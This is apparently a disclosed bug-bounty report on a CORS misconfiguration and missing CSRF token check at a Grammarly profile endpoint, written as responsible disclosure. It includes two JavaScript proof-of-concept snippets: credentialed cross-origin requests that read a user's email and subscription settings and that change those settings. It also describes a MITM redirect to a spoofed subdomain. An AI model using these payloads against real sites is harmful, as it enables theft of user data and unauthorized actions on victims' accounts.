# Lack of CSRF header validation at https://g-mail.grammarly.com/profile

## Report Details
- **Report ID**: 629892
- **URL**: https://hackerone.com/reports/629892
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-06-26T08:34:39.923Z
- **Disclosed**: 2019-10-31T03:57:12.157Z

## Reporter
- **Username**: orlserg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grammarly

## Vulnerability Information
Hello!

## Description
I found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is *http://www.grammarly.com*, then the server will respond: *Access-Control-Allow-Origin: http://www.grammarly.com*. That can lead to leakage of user data and unauthorized actions on behalf of the user.
{F517015}

In fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. 

####*Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.*

## How it works
{F517002}

If an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.

Using a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.

This vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139

## Vulnerable enpoints

1) The malicious javascript will look like:

```javascript
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
       document.getElementById("response-node").innerHTML = this.responseText;
   }
};
xhttp.open("GET", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send();
```
The response will contain the user's email address and subscription settings:
```
{"id":749327815,"email":"email@yandex.ru","preferenceFields":[{"name":"Weekly Progress Reports","description":"Get a weekly report with statistics and insights on how you are writing with Grammarly.","order":49,"value":true},{"name":"Product Updates","description":"Important info on new features and products. We may also ask for your feedback on occasion.","order":50,"value":true},{"name":"Grammarly Offers","description":"These emails may include special upgrade offers, limited-time events, or coupons. ","order":50,"value":true},{"name":"The Grammarly Blog","description":"A weekly newsletter that includes fun tips on all things writing.","order":50,"value":true},{"name":"Grammarly Business","description":"Updates and information on our products for multi-person teams.","order":55,"value":true}],"unsubscribe":false}
``` 

2) The malicious javascript will look like:

```javascript
var xhttp = new XMLHttpRequest();
var data = new FormData();
data.append("email", "████████");
data.append("unsubscribe", "false");
(...)
xhttp.open("POST", "https://g-mail.grammarly.com/profile", true);
xhttp.withCredentials = true;
xhttp.send(data);
```
The request will change the subscription settings. It looks like CSRF.

Now I'm trying to find more places to increase the impact.

## Impact

CORS misconfiguration lead to leakage of user data and unauthorized actions on behalf of the user.

## Attachments
- CORS.png
- burp.png
